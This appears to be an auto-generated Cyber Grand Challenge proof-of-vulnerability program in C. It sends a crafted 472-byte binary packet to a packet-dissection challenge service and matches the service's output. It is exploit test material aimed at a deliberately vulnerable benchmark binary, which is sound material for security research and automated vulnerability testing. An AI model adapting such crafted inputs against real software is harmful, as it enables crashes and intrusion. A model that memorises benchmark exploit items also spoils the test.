#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\xd8\x01\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x00\x00\x00\x00\xc0\x01\x00\x00\xb8\x01\x00\x00"
         "\x00\x00\x00\x00\x10\x01\x10\x10\x00\x00\x00\x00\xb8\x01\x00\x00"
         "\xc3\xb3\xe6\x78\x30\x81\x06\x8f\xda\x2a\x05\xb2\x74\x2c\xe3\x53"
         "\xae\x09\xd6\xce\x40\x00\x00\x00\xff\x41\x00\xdd\xff\xbe\xbd\xa6"
         "\xdb\x22\x61\xa0\x57\x67\x72\xa3\xa5\x4c\x93\x01\x00\x93\xb9\x30"
         "\x16\x49\xd3\x69\x64\xb3\x54\x1f\xff\xff\x01\x04\x01\x22\x66\x2c"
         "\x08\x7e\x33\x4c\x2f\xbf\x85\x23\x7f\xc9\xc2\x5c\xb0\x23\x11\x8b"
         "\xaa\x33\x01\x00\x7a\x63\x3c\x8d\xed\x01\x2e\xd3\x01\x31\x16\xd6"
         "\x9c\x6e\x79\x39\x3c\x5b\x94\x68\xbf\x80\x02\x1f\xf3\x99\x01\x10"
         "\x14\x6f\xbd\x0f\x3c\x8c\x5c\x65\xd9\xc1\xad\x8b\x0a\xf6\x82\x38"
         "\x09\x00\xb1\xc4\xff\xff\xff\xff\x16\x8d\xd5\x26\x83\xcf\x99\x71"
         "\x64\x67\xee\xe0\xa1\xa8\xff\xff\xce\x3d\x9a\x21\x29\xed\xed\x32"
         "\x41\x00\x01\x00\x4a\x21\x2d\x04\x96\xa8\x24\x73\x21\x55\xff\xde"
         "\xf9\x23\x49\x0f\x58\x93\x96\x88\x55\x33\x13\x64\x1b\x65\x39\x32"
         "\xb1\xe5\x13\x19\x5e\x9f\xf0\xcb\x31\x82\x9b\x86\xb7\xa5\xc1\x3a"
         "\xf7\xcc\xbe\x6d\x52\x6f\x6f\xd2\x9c\xcd\x05\x32\x4b\x94\xc7\x88"
         "\x45\x6d\x38\x74\x89\xb5\xc7\xa5\x1a\xe8\x7f\xfe\xd1\xdf\xfc\x99"
         "\x82\xe9\xca\xb6\x9e\x8f\x80\xa1\x92\x68\x44\xba\xd4\x99\x19\x1f"
         "\x10\xe0\x96\x34\x91\x29\x96\xe5\xc5\x2d\x2b\x72\xf4\xb6\xbc\x4c"
         "\xcd\x7c\x22\x73\xd4\x90\x75\x1f\x4e\x19\x31\xaa\x51\x04\x43\x53"
         "\x82\x5b\xa2\xfd\xd5\xbc\x6d\xca\x40\x59\xfe\xf8\x16\x49\xac\xd5"
         "\xbf\x66\x5e\x64\x66\x8e\x38\x23\xcf\xcc\x5d\x58\x84\x68\x61\xea"
         "\x90\x7b\x29\xe0\x46\xe0\x1a\x10\xd2\xa5\xc4\x30\x72\x09\x21\xa3"
         "\x9b\x25\x44\x48\xad\x84\x8e\x0d\x1f\x48\x7e\xfa\x75\xdd\xd7\xde"
         "\x0e\xe7\xfe\x5d\xe6\x96\xbf\x5c\x71\x10\x94\x81\xe6\xd8\x35\x91"
         "\xaf\x8b\x33\x87\xb0\x01\x5a\x49\x3f\xb3\x2a\x70\x2f\x8d\x96\x37"
         "\x62\xf7\xa0\x74\xe1\xaf\x85\xcb\xae\x43\xf2\x9d\x11\x4c\xd5\x81"
         "\x21\x12\x30\xca\x07\xe7\xe6\x6d\xd2\x49\x49\x29\x32\x15\x9e\xca"
         "\xec\x6f\xf3\x23\x8a\xbf\x5c\x9a\xd1\x0a\xf4\x80\xa2\x7d\x5c\xb1"
         "\x9b\xa6\x01\x00\x8c\xb3\x01\x90";
      static unsigned int write_00001_00000_len = 472;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===llama
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===llamasquatinid
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61\x73\x71\x75\x61\x74\x69"
         "\x6e\x69\x64";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
